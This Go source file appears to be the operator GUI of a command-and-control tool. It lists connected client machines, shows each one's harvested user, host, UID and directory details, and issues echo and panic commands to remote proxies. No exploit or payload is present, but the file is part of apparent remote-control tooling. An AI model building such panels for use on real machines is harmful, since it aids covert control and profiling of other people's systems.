package main

import (
	"example.com/itsuMain/lib/message"
	"example.com/itsuMain/lib/util"
	"example.com/itsuMain/lib/vm"
	"example.com/itsuMain/lib/vm/itsu_forth"
	"fmt"
	g "github.com/AllenDang/giu"
	"image"
	"image/draw"
	"image/png"
	"io"
	"log"
	"math"
	"os"
	"sort"
	"strings"
	"time"
)

var (
	guiSortMode int

	texWindows *image.RGBA
	texLinux   *image.RGBA
	texMac     *image.RGBA
	texUnk     *image.RGBA

	conditionEditor       *g.CodeEditorWidget
	lastCompileError      error     = nil
	lastCompilerErrorDate time.Time = time.Now()
	builtProgram          vm.BuiltProgram
	serializedProgram     []byte
)

func init() {
	conditionEditor = g.CodeEditor().
		ShowWhitespaces(false).
		TabSize(2).
		Text(`CNUM_const0 1 CMP >=
CNUM_const0 3 CMP <=
AND
"asdasdasd" CSTR_const1 CMP ==
OR
HLT`).Size(0, 120)
}

func init() {
	var (
		iconWindows image.Image
		iconLinux   image.Image
		iconMac     image.Image
		iconUnk     image.Image
	)

	openOne := func(s string, i *image.Image) {
		var err error
		var reader io.Reader

		if reader, err = os.Open(s); err != nil {
			log.Panicln(err)
		}

		if *i, err = png.Decode(reader); err != nil {
			log.Panicln(err)
		}
	}

	openOne("windows_32.png", &iconWindows)
	openOne("linux_32.png", &iconLinux)
	openOne("mac_32.png", &iconMac)
	openOne("unk_32.png", &iconUnk)

	toRGBA := func(i image.Image) *image.RGBA {
		bounds := i.Bounds()
		rgba := image.NewRGBA(image.Rect(0, 0, bounds.Dx(), bounds.Dy()))
		draw.Draw(rgba, rgba.Bounds(), i, bounds.Min, draw.Src)
		return rgba
	}

	texWindows = toRGBA(iconWindows)
	texLinux = toRGBA(iconLinux)
	texMac = toRGBA(iconMac)
	texUnk = toRGBA(iconUnk)
}

func goosToIcon(goos string) *image.RGBA {
	switch goos {
	case "linux":
		return texLinux
	case "windows":
		return texWindows
	case "darwin":
		return texMac
	default:
		return texUnk
	}
}

func guiClientsList() *g.TableWidget {
	type intermediate struct {
		id       uint64
		lastSeen int
		sysInfo  util.SystemInformation
		addr     string
	}

	intermediates := make([]intermediate, len(state.serverClientsLastSeen))

	state.serverClientsMutex.Lock()

	i := 0
	for k, v := range state.serverClientsLastSeen {
		intermediates[i].id = k
		intermediates[i].lastSeen = (int)(math.Trunc(time.Now().Sub(v).Seconds()))
		intermediates[i].sysInfo = state.serverClients[k].SysInfo
		intermediates[i].addr = state.serverClients[k].Address
		i++
	}

	state.serverClientsMutex.Unlock()

	sortFuncs := []func(i, j int) bool{
		func(i, j int) bool { return intermediates[i].id < intermediates[j].id }, //id ascending
		func(i, j int) bool { return intermediates[i].id > intermediates[j].id }, //id descending
		func(i, j int) bool { return intermediates[i].sysInfo.ProcMaxID < intermediates[j].sysInfo.ProcMaxID },
		func(i, j int) bool { return intermediates[i].sysInfo.ProcMaxID > intermediates[j].sysInfo.ProcMaxID },
	}

	sort.Slice(intermediates, sortFuncs[guiSortMode])

	rows := make([]*g.TableRowWidget, len(intermediates))

	for k, v := range intermediates {
		idCopy := v.id
		rows[k] = g.TableRow(
			g.SmallButton(" ").OnClick(func() {
				selectedID = idCopy
			}),
			g.Label(fmt.Sprint(v.id)),
			g.Label(v.addr),
			g.Label(fmt.Sprint(v.lastSeen)),
			g.Label(fmt.Sprint(v.sysInfo.ProcMaxID)),
			g.ImageWithRgba(goosToIcon(v.sysInfo.GOOS)).Size(fontSize, fontSize),
		)
	}

	return g.Table().
		Columns(
			g.TableColumn("Sel").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*3),
			g.TableColumn("ID").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*20),
			g.TableColumn("Address").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*20),
			g.TableColumn("Secs").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*4),
			g.TableColumn("CPU").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*3),
			g.TableColumn("OS").Flags(g.TableColumnFlagsWidthFixed).InnerWidthOrWeight(fontSize*2),
		).
		Freeze(0, 1).
		Rows(rows...)
}

func guiClientInformation() *g.TableWidget {
	info := message.ClientInformation{}

	if selectedID != 0 {
		state.serverClientsMutex.RLock()
		var ok bool
		if info, ok = state.serverClients[selectedID]; !ok {
			selectedID = 0
			info = message.ClientInformation{}
		}
		state.serverClientsMutex.RUnlock()
	}

	infoRows := make([]*g.TableRowWidget, 0)

	Append := func(label string, vs ...interface{}) {
		infoRows = append(infoRows, g.TableRow(g.Label(label), g.Label(fmt.Sprint(vs...))))
	}

	brandStr := info.SysInfo.ProcBranding
	if idx := strings.Index(brandStr, "\000"); idx != -1 {
		brandStr = brandStr[:idx]
	}

	Append("Runtime processors", info.SysInfo.GONumCPU)
	Append("CPUID processors", info.SysInfo.ProcMaxID)
	Append("CPU Model", brandStr)

	Append("OS/ARCH", info.SysInfo.GOOS, "/", info.SysInfo.GOARCH)
	Append("User",
		info.SysInfo.Username, "@", info.SysInfo.Hostname, ", ",
		info.SysInfo.UID, ":", info.SysInfo.GID, " (", info.SysInfo.EUID, ":", info.SysInfo.EGID, ")")
	Append("Home directory", info.SysInfo.HomeDir)
	Append("Config directory", info.SysInfo.ConfigDir)
	Append("Cache directory", info.SysInfo.CacheDir)
	Append("Working directory", info.SysInfo.WorkingDir)
	Append("Executable path", info.SysInfo.ExecPath)

	return g.Table().
		FastMode(true).
		Columns(
			g.TableColumn("Field"),
			g.TableColumn("Value")).
		Rows(infoRows...)
}

func guiProxyConditions() g.Layout {
	return g.Layout{
		conditionEditor,
		g.Button("Compile").OnClick(func() {

			builder := vm.NewProgramBuilder()

			if lastCompileError = itsu_forth.CompileFORTH(builder, conditionEditor.GetText()); lastCompileError != nil {
				lastCompilerErrorDate = time.Now()
				return
			}

			builtProgram = builder.Build()

			log.Println(serializedProgram)
		}), g.Label(fmt.Sprint("Last error: ", lastCompileError, "\ntook place at ", lastCompilerErrorDate.Format("15:04:05"))),
	}
}

func loop() {
	g.SingleWindow().Layout(
		g.SplitLayout(g.DirectionHorizontal, 320,
			g.Layout{
				g.Row(g.Label("Clients list"), g.Button("Toggle refreshes").OnClick(func() { state.ToggleRefreshes() }), g.Label(fmt.Sprint("Refreshing? ", state.IsRefreshing()))),
				g.Row(
					g.Button("ID Asc").OnClick(func() { guiSortMode = 0 }),
					g.Button("ID Des").OnClick(func() { guiSortMode = 1 }),
					g.Button("CPU Asc").OnClick(func() { guiSortMode = 2 }),
					g.Button("CPU Des").OnClick(func() { guiSortMode = 3 }),
				),
				guiClientsList(),
			},
			g.Layout{
				g.SplitLayout(g.DirectionVertical, 300, g.Layout{
					g.Row(
						g.Label("Information Pane"),
						g.Label("|"),
						g.Label(fmt.Sprint("Selected ID: ", selectedID))),
					guiClientInformation(),
				}, g.Layout{
					g.Label("C&C"),
					g.SplitLayout(g.DirectionHorizontal, 300,
						guiProxyConditions(),
						g.Layout{
							g.Label("Message to proxy"),
							g.InputInt(&CmdDuration).Label("Expires in (seconds)"),
							g.Row(g.InputText(&CmdArgsEchoMessage), g.Button("Send CommandEcho").OnClick(func() { issueCommand(message.CommandEcho{Message: CmdArgsEchoMessage}) })),
							g.Row(g.InputText(&CmdArgsPanicMessage), g.Button("Send CommandPanic").OnClick(func() { issueCommand(message.CommandPanic{Message: CmdArgsPanicMessage}) })),
						}),
				}),
			}))
}
